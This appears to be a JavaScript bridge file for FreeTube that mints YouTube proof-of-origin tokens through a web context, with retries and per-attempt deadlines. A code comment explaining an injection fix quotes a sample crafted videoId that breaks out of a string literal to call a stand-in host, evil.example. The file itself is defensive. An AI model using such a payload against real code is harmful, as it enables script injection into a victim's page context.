// The two window.ftElectron members that carry decisions rather than a shape:
// generatePoToken, which mints YouTube's proof-of-origin token through
// orivon.web.openContext (ADR-0019), and getNavigationHistory, which answers
// from the document itself.
//
// The other 32 are declared in ./members.json and generated -- see
// ../README.md for the table, and src/bridge/ for what generates them. This
// file is spliced into the composed bridge, so it is not a module: it declares
// `appMembers`, which the installer calls with the kit.

let cachedBotGuardScript

async function fetchBotGuardScript () {
  if (cachedBotGuardScript !== undefined) return cachedBotGuardScript
  const response = await fetch('/orivon/botGuardScript.js')
  if (!response.ok) throw new Error(`botGuardScript.js: HTTP ${response.status}`)
  cachedBotGuardScript = await response.text()
  return cachedBotGuardScript
}

/**
 * src/main/poTokenGenerator.js's own rewrite: swap the module's
 * `export{X as default};` tail for a call passing this mint's own arguments,
 * spliced in as the JSON-string literals FreeTube already serialised them to.
 *
 * `videoId` is the one argument here that is NOT already a JSON-string literal
 * upstream produced -- it is a bare string that ultimately traces back to the
 * URL (`#/watch/<videoId>`, an attacker-reachable route), so upstream's own
 * `"${videoId}"` splice would let a crafted id such as
 * `"});fetch("https://evil.example");//` break out of the string literal and
 * inject script into the youtube.com context this runs in.
 * `JSON.stringify(videoId)` closes that: whatever `videoId` contains, the
 * result is one JSON string literal. `context`/`initialAttestationData`/
 * `ytConfig` stay spliced as-is because they are already `JSON.stringify`
 * output from FreeTube's own call site (`local.js`), not raw input --
 * re-encoding them would double-encode, and upstream's real Electron build
 * splices them the same way.
 */
function rewriteBotGuardScript (script, videoId, context, initialAttestationData, ytConfig) {
  const exportMatch = script.match(/export\{(\w+) as default\};/)
  if (exportMatch === null) {
    throw new Error('botGuardScript.js: no `export{X as default};` tail -- pack:botGuardScript output changed shape')
  }
  const params = `${JSON.stringify(videoId)},${context},${initialAttestationData},${ytConfig}`
  return `${script.slice(0, exportMatch.index)};${exportMatch[1]}(${params})`
}

// Upstream runs one mint at a time over its single Electron session
// (poTokenGenerator.js's enqueueAsyncFunction); an open WebContext costs an
// app one of LIMITS.webContexts, so the same discipline applies here.
let mintQueue = Promise.resolve()

function queueMint (run) {
  const result = mintQueue.then(run, run)
  mintQueue = result.then(() => {}, () => {})
  return result
}

/**
 * BotGuard's own snapshot/entropy step is observed to hang inside its own
 * opaque code roughly half the time under headless Xvfb with no real GPU
 * (../README.md's "Playback on the Electron-renderer build" -- a real mint
 * takes 440-520ms end to end, and a hung one never resolves or rejects at
 * all). `LIMITS.webContextEvaluateMs` (60s, capability-api.ts) is the broker's
 * own outer bound and exists to protect the broker's own bookkeeping, not to
 * make a stalled mint usable -- it is far longer than FreeTube's own 45s
 * watch-page budget, so waiting for it strands the whole page. This deadline
 * is this bridge's own, well inside both.
 */
const MINT_ATTEMPT_DEADLINE_MS = 15_000

// One initial attempt plus up to two retries, each in a fresh context --
// ../README.md's own measurement is that a real mint is about half as likely
// to stall as to succeed, so three independent attempts leaves roughly a
// one-in-eight chance every one of them stalls.
const MINT_MAX_ATTEMPTS = 3

const MINT_DEADLINE_HIT = Symbol('mint-attempt-deadline-hit')

/** Internal control-flow signal: this one attempt hit its own deadline. Never thrown past generatePoToken -- see its own retry loop. */
class PoTokenMintAttemptTimeoutError extends Error {}

/** The named error generatePoToken throws once every attempt has stalled. */
class PoTokenMintStalledError extends Error {
  constructor (attempts) {
    super(`generatePoToken: BotGuard did not answer within ${String(MINT_ATTEMPT_DEADLINE_MS)}ms in any of ${String(attempts)} attempt(s), each in its own context`)
    this.name = 'PoTokenMintStalledError'
    this.attempts = attempts
  }
}

/**
 * One mint attempt, in its own fresh context, bounded by
 * MINT_ATTEMPT_DEADLINE_MS. `ctx.close()` always runs, on every exit path
 * (success, a real rejection, or a timeout) -- closing a context whose
 * `evaluate` is still pending is what makes that pending call settle at all
 * (handle-store.ts's `closeTree` cancels every in-flight operation scoped to
 * the handle being closed), which is also why `evaluated` is given its own
 * `.catch(() => {})` here: on the timeout path this function has already moved
 * on by the time that cancellation rejects it, and nothing else is left to
 * observe that rejection.
 */
async function attemptMintOnce (orivon, mintScript) {
  const ctx = await orivon.web.openContext('https://www.youtube.com', { width: 1920, height: 1080 })
  try {
    const evaluated = ctx.evaluate(mintScript)
    evaluated.catch(() => {})
    let deadlineTimer
    const deadline = new Promise((resolve) => {
      deadlineTimer = setTimeout(resolve, MINT_ATTEMPT_DEADLINE_MS, MINT_DEADLINE_HIT)
    })
    const outcome = await Promise.race([evaluated, deadline])
    clearTimeout(deadlineTimer)
    if (outcome === MINT_DEADLINE_HIT) throw new PoTokenMintAttemptTimeoutError()
    return outcome
  } finally {
    await ctx.close()
  }
}

function generatePoToken (kit, videoId, context, initialAttestationData, ytConfig) {
  return queueMint(async () => {
    const orivon = kit.getOrivon()
    if (orivon?.web === undefined) {
      throw new kit.BridgeError('generatePoToken', 'not-built', 'orivon.web is not implemented in this build; ADR-0019 lands separately')
    }
    const script = await fetchBotGuardScript()
    const mintScript = rewriteBotGuardScript(script, videoId, context, initialAttestationData, ytConfig)

    for (let attempt = 1; attempt <= MINT_MAX_ATTEMPTS; attempt += 1) {
      try {
        return await attemptMintOnce(orivon, mintScript)
      } catch (error) {
        // A real rejection (a script error, a denied/closed grant) is not this
        // attempt's own deadline -- propagate it immediately, since retrying
        // cannot fix a script that already ran and failed.
        if (!(error instanceof PoTokenMintAttemptTimeoutError)) throw error
        if (attempt === MINT_MAX_ATTEMPTS) throw new PoTokenMintStalledError(attempt)
        // Else: this attempt's own deadline fired (attemptMintOnce's own
        // `finally` already closed it) and attempts remain -- retry in a fresh
        // context, the top of the loop.
      }
    }
    // Unreachable: MINT_MAX_ATTEMPTS >= 1, so the loop above always either
    // returns or throws before falling off its own end.
    throw new PoTokenMintStalledError(MINT_MAX_ATTEMPTS)
  })
}

function appMembers (kit) {
  kit.expose('rewriteBotGuardScript', rewriteBotGuardScript)
  kit.expose('PoTokenMintStalledError', PoTokenMintStalledError)
  kit.expose('MINT_ATTEMPT_DEADLINE_MS', MINT_ATTEMPT_DEADLINE_MS)
  kit.expose('MINT_MAX_ATTEMPTS', MINT_MAX_ATTEMPTS)

  return {
    // One entry, marked active, so TopNav.vue's
    // `dropdownOptions.find(option => option.active)` never sees undefined --
    // an empty array throws the next time the page title changes while this
    // call is in flight (setNavigationHistoryDropdownOptions assigns straight
    // to `activeEntry.label`).
    getNavigationHistory: async () => [{ label: document.title, active: true, value: 0 }],

    generatePoToken: (videoId, contextJson, attestationJson, ytConfigJson) =>
      generatePoToken(kit, videoId, contextJson, attestationJson, ytConfigJson)
  }
}
